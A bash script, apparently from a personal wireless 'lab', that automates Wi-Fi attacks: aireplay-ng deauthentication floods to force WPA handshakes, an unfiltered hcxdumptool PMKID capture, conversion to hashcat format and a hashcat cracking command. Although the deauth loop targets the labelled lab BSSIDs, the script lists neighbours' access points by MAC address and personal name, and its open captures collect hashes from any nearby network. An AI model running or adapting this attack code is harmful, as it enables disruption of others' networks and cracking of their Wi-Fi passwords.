#!/usr/bin/env bash
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
# WXF Lab — Comprehensive wireless reconnaissance
# Run: sudo bash 03_recon_scan.sh <monitor_interface>
set -euo pipefail

IFACE="${1:-wlan0mon}"
OUTDIR="/mnt/d/Projetos-SafeLabs/laboratory/wifi-recon/captures"
LOGDIR="/mnt/d/Projetos-SafeLabs/laboratory/wifi-recon/.log"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
LOG="$LOGDIR/recon_${TIMESTAMP}.log"

mkdir -p "$OUTDIR" "$LOGDIR"

echo "[$(date)] === WXF Wireless Reconnaissance ===" | tee "$LOG"
echo "[*] Interface: $IFACE" | tee -a "$LOG"
echo "[*] Output: $OUTDIR" | tee -a "$LOG"

# ── Phase 1: Passive discovery (all channels) ─────────────────────────
echo "" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"
echo "  PHASE 1: Passive Discovery (60s, all channels)" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"

SCAN_PREFIX="$OUTDIR/scan_all_${TIMESTAMP}"
timeout 60 airodump-ng "$IFACE" \
    --output-format csv,pcap,kismet \
    -w "$SCAN_PREFIX" \
    --wps \
    --manufacturer \
    2>&1 | tee -a "$LOG" &
AIRO_PID=$!

echo "[*] airodump-ng running (PID $AIRO_PID) for 60s..." | tee -a "$LOG"
wait $AIRO_PID 2>/dev/null || true

echo "[OK] Phase 1 complete. Files: ${SCAN_PREFIX}*" | tee -a "$LOG"

# ── Phase 2: Lab target focused scan ──────────────────────────────────
echo "" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"
echo "  PHASE 2: TrOll Lab Target (120s, ch3 + ch149)" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"

LAB_BSSID_2G="f0:25:8e:ea:a1:38"
LAB_BSSID_5G="f0:25:8e:ea:a1:3c"
LAB_CH="3,149"
LAB_PREFIX="$OUTDIR/troll_lab_${TIMESTAMP}"

timeout 120 airodump-ng "$IFACE" \
    --bssid "$LAB_BSSID_2G" \
    --channel "$LAB_CH" \
    --output-format csv,pcap \
    -w "$LAB_PREFIX" \
    --wps \
    2>&1 | tee -a "$LOG" &
AIRO_PID=$!

echo "[*] Targeted scan on TrOll lab (PID $AIRO_PID)..." | tee -a "$LOG"

sleep 10

echo "[*] Sending deauth to force handshake (lab only)..." | tee -a "$LOG"
aireplay-ng --deauth 5 -a "$LAB_BSSID_2G" "$IFACE" 2>&1 | tee -a "$LOG" &
sleep 5
aireplay-ng --deauth 5 -a "$LAB_BSSID_5G" "$IFACE" 2>&1 | tee -a "$LOG" &

wait $AIRO_PID 2>/dev/null || true
echo "[OK] Phase 2 complete." | tee -a "$LOG"

# ── Phase 3: PMKID capture (clientless) ──────────────────────────────
echo "" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"
echo "  PHASE 3: PMKID Capture — hcxdumptool (60s)" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"

PMKID_FILE="$OUTDIR/pmkid_${TIMESTAMP}.pcapng"
timeout 60 hcxdumptool -i "$IFACE" \
    -o "$PMKID_FILE" \
    --active_beacon \
    --enable_status=15 \
    2>&1 | tee -a "$LOG" || echo "[!] hcxdumptool finished/failed" | tee -a "$LOG"

echo "[OK] Phase 3 complete." | tee -a "$LOG"

# ── Phase 4: Convert captures ─────────────────────────────────────────
echo "" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"
echo "  PHASE 4: Convert Captures to Hashcat Format" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"

HASH_FILE="$OUTDIR/hashes_${TIMESTAMP}.hc22000"

for pcap in "$OUTDIR"/*.pcap "$OUTDIR"/*.pcapng; do
    [ -f "$pcap" ] || continue
    echo "[*] Processing: $pcap" | tee -a "$LOG"
    hcxpcapngtool -o "$HASH_FILE" "$pcap" 2>&1 | tee -a "$LOG" || true
done

if [ -f "$HASH_FILE" ] && [ -s "$HASH_FILE" ]; then
    HASH_COUNT=$(wc -l < "$HASH_FILE")
    echo "[OK] $HASH_COUNT hashes extracted to $HASH_FILE" | tee -a "$LOG"
else
    echo "[!] No hashes extracted (no handshakes/PMKIDs captured yet)" | tee -a "$LOG"
fi

# ── Phase 5: Aggressive scan — top APs ───────────────────────────────
echo "" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"
echo "  PHASE 5: Deauth + Capture Top Targets (90s)" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"

TOP_APS=(
    "72:4e:6b:1a:cb:90"   # UNIAOGEEK 2.4G (skip — own)
    "f0:25:8e:ea:a1:38"   # TrOll 2.4G — lab
    "f0:25:8e:ea:a1:3c"   # TrOll 5G — lab
    "10:41:21:04:b9:b8"   # Felipe.2G
    "58:56:c2:c5:7f:3c"   # AP 1305
    "e8:20:e2:06:0f:4b"   # Denise
    "94:2c:b3:93:38:d6"   # Thays
    "e8:45:8b:ae:00:08"   # MAURI
    "cc:29:bd:20:18:ab"   # VOE_AP1704
    "84:01:12:bf:f4:3c"   # Ricardo
)

AGG_PREFIX="$OUTDIR/aggressive_${TIMESTAMP}"
timeout 90 airodump-ng "$IFACE" \
    --output-format csv,pcap \
    -w "$AGG_PREFIX" \
    2>&1 | tee -a "$LOG" &
AGG_PID=$!

sleep 15

echo "[*] Targeting lab AP for handshake..." | tee -a "$LOG"
for bssid in "${TOP_APS[@]:1:2}"; do
    echo "  [deauth] $bssid" | tee -a "$LOG"
    aireplay-ng --deauth 10 -a "$bssid" "$IFACE" 2>&1 | tee -a "$LOG" &
    sleep 3
done

wait $AGG_PID 2>/dev/null || true

echo "[OK] Phase 5 complete." | tee -a "$LOG"

# ── Phase 6: Post-scan analysis ──────────────────────────────────────
echo "" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"
echo "  PHASE 6: Post-Scan Analysis" | tee -a "$LOG"
echo "════════════════════════════════════════════════" | tee -a "$LOG"

FINAL_HASH="$OUTDIR/all_hashes_${TIMESTAMP}.hc22000"
for pcap in "$OUTDIR"/*.pcap "$OUTDIR"/*.pcapng; do
    [ -f "$pcap" ] || continue
    hcxpcapngtool -o "$FINAL_HASH" "$pcap" 2>&1 | tee -a "$LOG" || true
done

if [ -f "$FINAL_HASH" ] && [ -s "$FINAL_HASH" ]; then
    HASH_COUNT=$(wc -l < "$FINAL_HASH")
    echo "[OK] Total: $HASH_COUNT hashes in $FINAL_HASH" | tee -a "$LOG"
    echo "[>>] To crack: hashcat -m 22000 $FINAL_HASH <wordlist>" | tee -a "$LOG"
else
    echo "[!] No handshakes/PMKIDs captured in this session." | tee -a "$LOG"
    echo "    Possible reasons:" | tee -a "$LOG"
    echo "    - No active clients on target networks" | tee -a "$LOG"
    echo "    - PMF enabled (blocks deauth)" | tee -a "$LOG"
    echo "    - Distance too far for injection" | tee -a "$LOG"
fi

echo "" | tee -a "$LOG"
echo "[*] Capture files:" | tee -a "$LOG"
ls -lh "$OUTDIR"/*"${TIMESTAMP}"* 2>/dev/null | tee -a "$LOG"

echo "" | tee -a "$LOG"
echo "[OK] Reconnaissance complete. Full log: $LOG" | tee -a "$LOG"
echo "[>>] Next steps:" | tee -a "$LOG"
echo "  1. Check CSV files for AP/station details" | tee -a "$LOG"
echo "  2. Run WXF modules: sudo bash 04_wxf_exploit.sh <interface>" | tee -a "$LOG"
